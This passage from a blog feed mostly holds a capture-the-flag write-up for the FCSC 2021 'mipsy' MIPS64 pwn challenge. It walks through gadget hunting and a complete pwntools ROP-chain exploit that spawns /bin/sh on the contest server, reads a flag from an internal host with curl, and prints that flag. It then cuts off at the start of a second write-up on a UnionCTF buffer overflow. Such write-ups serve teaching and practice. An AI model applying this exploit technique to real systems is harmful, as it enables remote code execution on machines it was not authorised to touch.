</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004114</span>                 <span class="no">lw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0xC</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>    <span class="c">; Load Word
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004118</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; fd
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000411</span><span class="no">C</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">close</span>       <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004120</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; close
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004124</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; close      ; Jump And Link Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004128</span>                 <span class="no">nop</span>                      <span class="c">; nop
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000412</span><span class="no">C</span>                 <span class="no">ld</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x1010</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Load Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004130</span>                 <span class="no">daddiu</span>  <span class="no">$v1</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x1010</span>  <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004134</span>                 <span class="no">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$zero</span>       <span class="c">; envp
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004138</span>                 <span class="no">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$v1</span>         <span class="c">; argv
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000413</span><span class="no">C</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; path
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004140</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">execve</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004144</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; execve
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004148</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; execve     ; Jump And Link Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000414</span><span class="no">C</span>                 <span class="no">nop</span>
<span class="c">; skip
</span></code></pre></div><p>It&rsquo;s a part of the <code>ip</code> function, called when we trigger the &ldquo;Show network interfaces&rdquo; option. When I saw at the begin of the function, some local variables like a pointer to the <code>&quot;/bin/sh&quot;</code> string and a block of code which executes especially <code>execve(&quot;/bin/sh&quot;, &quot;-c&quot;, NULL)</code>. Since I discovered this basic block I thought I should have to jump around it with the right stackframe. But after a few hours I figured out it wasn&rsquo;t possible :(. And figured out too that the <code>NULL</code> byte isn&rsquo;t a badchar :).</p>
<div class="gblog-post__anchorwrap">
    <h4 id="ropchain">
        ROPchain
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#ropchain" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h4>
</div>
<p>Now we&rsquo;re able to craft a ropchain with only one badchar: &ldquo;\n&rdquo;. To do so we can launch <a
  class="gblog-markdown__link"
  href="https://github.com/JonathanSalwan/ROPgadget"
  
  >ROPgadget</a
> to find some suitable gadgets:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ ROPgadget --binary mipsy &gt; gadgets
</code></pre></div><p>On mips architechture there is no <code>ret</code> or <code>pop</code> instructions, to handle this issue we use gadgets which load directly a 64 bit value stored in the stack into a register like this:</p>
<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">ld $a0, 0x8($sp) ; It will read the doubleword in $sp+8 to load it in the $a0 register.
</code></pre><p>And to return we need to find a load on a register like <code>$t9</code> which is often used to resolve and call extern functions or on <code>$ra</code> which is the standard register used to store the address of the calling function.</p>
<p>And that&rsquo;s why it&rsquo;s too hard to find automatically gadgets for mips binaries. But fortunately, ROPgadgets finds a a great amount of gadgets which helps us a lot.</p>
<p>The exploitation would be for me to jmp to the execve&rsquo;s call with the right context.
The code looks like such:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">0000000120004134</span>                 <span class="nf">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$zero</span>       <span class="c">; envp
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004138</span>                 <span class="no">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$v1</span>         <span class="c">; argv
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000413</span><span class="no">C</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; path
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004140</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">execve</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004144</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; execve
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004148</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; execve     ; Jump And Link Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000414</span><span class="no">C</span>                 <span class="no">nop</span>
</code></pre></div><p>To do so we have to:</p>
<ul>
<li>set <code>$v1</code> register to <code>NULL</code></li>
<li>set <code>$v0</code> register to a pointer to <code>/bin/sh</code></li>
<li>set <code>$gp</code>, the global pointer to the right value to be able do execute the <code>dla</code> instruction.</li>
</ul>
<p>An important thing to notice is that on mips architechture, when an instruction is executed the next instruction is too executed despite of the result of the current instruction. So when we will choose our gadgets, we need to be careful according to the instruction after the control flow instruction.</p>
<p>And the good value for <code>$gp</code> is a constant from which the <a
  class="gblog-markdown__link"
  href="https://sourceware.org/binutils/docs-2.24/as/MIPS-Small-Data.html"
  
  ><code>dla</code></a
> instruction addresses memory areas. And if we check the value of <code>$gp</code> in gdb, we got: <code>0x120048020</code>.</p>
<p>To control the <code>$v1</code> register we can grep on the gadgets found by ROPgadget:</p>
<pre tabindex="0"><code>$ grep &quot;ld \$v0, &quot; gadgets | grep \$sp
</code></pre><p>Then we got a lot of candidate which are not efficient. And if we&rsquo;re very careful we find an interesting gadget:</p>
<pre tabindex="0"><code>0x000000012001b4d8 : ld $v0, 0x210($sp) ; ld $t9, 0x228($sp) ; jalr $t9 ; move $a0, $s6
</code></pre><p>It&rsquo;s perfect because it allows us to control the value of <code>$v0</code> and the value of the next gadget that we can store in <code>$t9</code> to jump on !</p>
<p>We can apply process to find a gadget for $v1:</p>
<pre tabindex="0"><code>$ grep &quot;ld \$v1, &quot; gadgets | grep \$sp
[skip]
0x000000012001270c : ld $v1, 0x80($sp) ; sd $v0, 0xf0($sp) ; dsubu $s5, $v0, $v1 ; dsll $v0, $s5, 6 ; ld $a0, 0xb8($sp) ; ld $t9, 0xe0($sp) ; move $a1, $v0 ; sd $v1, 0xf8($sp) ; jalr $t9 ; sd $v0, 0x100($sp)
[skip]
</code></pre><p>It&rsquo;s a gadget a bit more hard to understand but we just have to take care to: do not write <code>$v0</code>, control the value of <code>$v9</code> to jump on, control the value of <code>$v1</code>. And so this gadget is a good candidate.</p>
<p>Finally we need to control the value of the <code>$gp</code> register but to achieve that we do not need to use a gadget, because we already control it thanks to the vuln epilogue:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">00000001200046</span><span class="nf">A4</span> <span class="no">loc_1200046A4</span><span class="p">:</span>                           <span class="c"># CODE XREF: authenticate+104↑j
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">A4</span>                 <span class="no">move</span>    <span class="no">$sp</span><span class="p">,</span> <span class="no">$fp</span>         <span class="c"># _
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">A8</span>                 <span class="no">ld</span>      <span class="no">$ra</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">ret_addr</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c"># Load Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">AC</span>                 <span class="no">ld</span>      <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_10</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c"># Load Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">B0</span>                 <span class="no">ld</span>      <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_18</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c"># Load Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">B4</span>                 <span class="no">daddiu</span>  <span class="no">$sp</span><span class="p">,</span> <span class="mi">0x90</span>        <span class="c"># Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">B8</span>                 <span class="no">jr</span>      <span class="no">$ra</span>              <span class="c"># Jump Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">BC</span>                 <span class="no">nop</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="put-all-together">
        Put all together
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#put-all-together" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Put all together" href="#put-all-together">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>For the pruposes of mips exploitation I developped a small function in python which inserts automatically a value at an arbitrary offset.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">make_pld</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">pos</span><span class="p">):</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="n">pos</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Gadget: s += </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
        <span class="n">s</span> <span class="o">+=</span> <span class="n">val</span>
        <span class="k">return</span> <span class="n">s</span>
    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">pos</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Gadget: </span><span class="si">{</span><span class="n">s</span><span class="p">[:</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">s</span><span class="p">[</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">val</span><span class="p">):]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="p">[:</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">val</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">val</span><span class="p">):]</span>
        <span class="k">return</span> <span class="n">s</span> 
    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">pos</span><span class="p">:</span>
        <span class="n">k</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">pos</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Gadget: </span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">pos</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="o">+</span> <span class="n">val</span>
</code></pre></div><p>It&rsquo;s very useful because we are then able to give the right offset about the stack pointer when we execute the gadgets.
We can begin by overwriting the value of the saved <code>$gp</code> and <code>$ra</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">GP</span> <span class="o">=</span> <span class="mh">0x120048020</span>
<span class="n">BASE_RSP</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">GP</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1"># $gp</span>
<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET_V1</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span> <span class="c1"># $ra</span>
</code></pre></div><p>BASE_RSP is the offset of the input&rsquo;s buffer about the <code>$sp</code> address when we return and so when we start to execute some gadgets.
We indicate the gadget to execute which is the gadget which sets <code>$v1</code> register to zero.</p>
<p>Then we can put the right value in <code>$v1</code> by looking at the SET_V1 gadget which loads the doubleword in <code>0x80($sp)</code> in <code>$v1</code>.
So we have to add to our payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x80</span><span class="p">))</span> <span class="c1"># $v1</span>
</code></pre></div><p>And we have to set the right value for the next gadget to execute. The gadget loads the doubleword in <code>0xe0($sp)</code> in <code>$t9</code> and then jmp on, so we can add our SET_V0 gadget to be then executed:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET_V0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">))</span> <span class="c1"># $t9</span>
</code></pre></div><p>We repeat the same operation for the SET_V0 gadget by setting a pointer to <code>'/bin/sh'</code> in <code>0x210($sp)</code> and the address of the final execve call in <code>0x228($sp)</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">BINSH</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x210</span><span class="p">))</span> <span class="c1"># $v0</span>
<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">EXECVE</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x228</span><span class="p">))</span> <span class="c1"># $t9</span>
</code></pre></div><p>We finished the ROPchain, now we just have to send it to the server and to enjoy the shell !</p>
<p>The final script looks like such:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/python3</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">ELF</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="n">remote</span><span class="p">,</span> <span class="n">p64</span> 

<span class="n">BINSH</span> <span class="o">=</span> <span class="mh">0x120025A20</span>

<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;mipsy&#39;</span><span class="p">)</span>

<span class="n">context</span><span class="o">.</span><span class="n">bits</span> <span class="o">=</span> <span class="mi">64</span> <span class="c1"># mips64</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;mips&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">&#34;big&#34;</span> <span class="c1"># Not a mipsel binary</span>

<span class="k">def</span> <span class="nf">make_pld</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">pos</span><span class="p">):</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="n">pos</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">+=</span> <span class="n">val</span>
        <span class="k">return</span> <span class="n">s</span>
    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">pos</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="p">[:</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">val</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">val</span><span class="p">):]</span>
        <span class="k">return</span> <span class="n">s</span> 
    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">pos</span><span class="p">:</span>
        <span class="n">k</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">pos</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">pos</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="o">+</span> <span class="n">val</span> 

<span class="n">SET_V0</span> <span class="o">=</span> <span class="mh">0x12001B4D8</span> <span class="c1"># : ld $v0, 0x210($sp) ; ld $t9, 0x228($sp) ; jalr $t9 ; move $a0, $s6</span>

<span class="n">SET_V1</span> <span class="o">=</span> <span class="mh">0x000000012001270c</span> <span class="c1"># : ld $v1, 0x80($sp) ; sd $v0, 0xf0($sp) ; dsubu $s5, $v0, $v1 ; dsll $v0, $s5, 6 ; ld $a0, 0xb8($sp) ; ld $t9, 0xe0($sp) ; move $a1, $v0 ; sd $v1, 0xf8($sp) ; jalr $t9 ; sd $v0, 0x100($sp)</span>

<span class="n">EXECVE</span> <span class="o">=</span> <span class="mh">0x120004134</span>

<span class="n">GP</span> <span class="o">=</span> <span class="mh">0x120048020</span>
<span class="n">BASE_RSP</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challenges2.france-cybersecurity-challenge.fr&#34;</span><span class="p">,</span> <span class="mi">4005</span><span class="p">)</span>
    <span class="c1"># return remote(&#34;localhost&#34;, 4000)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;] &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>

<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">GP</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1"># $gp</span>
<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET_V1</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span> <span class="c1"># $ra</span>
<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x80</span><span class="p">))</span> <span class="c1"># $v1</span>
<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET_V0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">))</span> <span class="c1"># $t9</span>
<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">BINSH</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x210</span><span class="p">))</span> <span class="c1"># $v0</span>
<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">EXECVE</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x228</span><span class="p">))</span> <span class="c1"># $t9</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="final-part">
        Final part
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#final-part" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final part" href="#final-part">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>According to the statements we need to read some files stored on the filer machine.
So firstly let&rsquo;s run the exploit to get the shell:</p>
<pre tabindex="0"><code>$ ./solve.py                                                                  
[!] Could not emulate PLT instructions for ELF('mipsy/mipsy')
[!] Could not populate PLT: not enough values to unpack (expected 2, got 0)
[*] 'mipsy/mipsy'
    Arch:     mips64-64-big
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x120000000)
    RWX:      Has RWX segments
[+] Opening connection to challenges2.france-cybersecurity-challenge.fr on port 4005: Done
[*] Switching to interactive mode
Error: wrong password.
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
list_interfaces.sh
mipsy
$
</code></pre><p>We see no flag, so according to the statements maybe we have to curl the filer machine which seems to be a HTTP server:</p>
<pre tabindex="0"><code>$ curl filer
&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
&lt;title&gt;Directory listing for /&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Directory listing for /&lt;/h1&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;flag&quot;&gt;flag&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>It&rsquo;s a directory listing of the files stored in filer, and so we just have to <code>curl filer/flag</code> to get the flag:</p>
<pre tabindex="0"><code>$ curl filer/flag
FCSC{82ed60ce9c8b1136b1da7df24c9996b6232671e66f62bad1bd0e3fc163761519}
</code></pre><p>And we got the flag !
This challenge was very cool because it&rsquo;s a &ldquo;real world&rdquo; scenario and it makes me discovering mips assembly !</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/FCSC" term="FCSC" label="FCSC" />
                             
                                <category scheme="https://nasm.re/tags/mipsy" term="mipsy" label="mipsy" />
                             
                                <category scheme="https://nasm.re/tags/n4sm" term="n4sm" label="n4sm" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/2021" term="2021" label="2021" />
                             
                                <category scheme="https://nasm.re/tags/mips" term="mips" label="mips" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[UnionCTF 2021 - pwn] babyrarf]]></title>
            <link href="https://nasm.re/posts/babyrarf/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/babyrarf/</id>
            
            <published>2021-02-21T00:00:00+00:00</published>
            <updated>2021-02-21T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<p>The binary can be found <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/blob/master/2021/unionctf/pwn/babyrarf/babyrarf?raw=true"
  
  >right here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="unionctf-babyrarf">
        [UnionCTF] Babyrarf
        <a data-clipboard-text="https://nasm.re/posts/babyrarf/#unionctf-babyrarf" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor [UnionCTF] Babyrarf" href="#unionctf-babyrarf">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Welcome guys,</p>
<p>This Write-Up is about de first pwn challenge of <a
  class="gblog-markdown__link"
  href="https://ctf.cr0wn.uk"
  
  >unionctf</a
>: <a
  class="gblog-markdown__link"
  href=""
  
  >babyrarf</a
>.
It was a really easy challenge with a stack based buffer overflow. The source code was provided so, no need to reverse the binary :).</p>
<p>Let&rsquo;s take a look at the src!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">attack</span> <span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">dmg</span><span class="p">;</span>
<span class="p">}</span> <span class="n">attack</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">character</span> <span class="p">{</span>
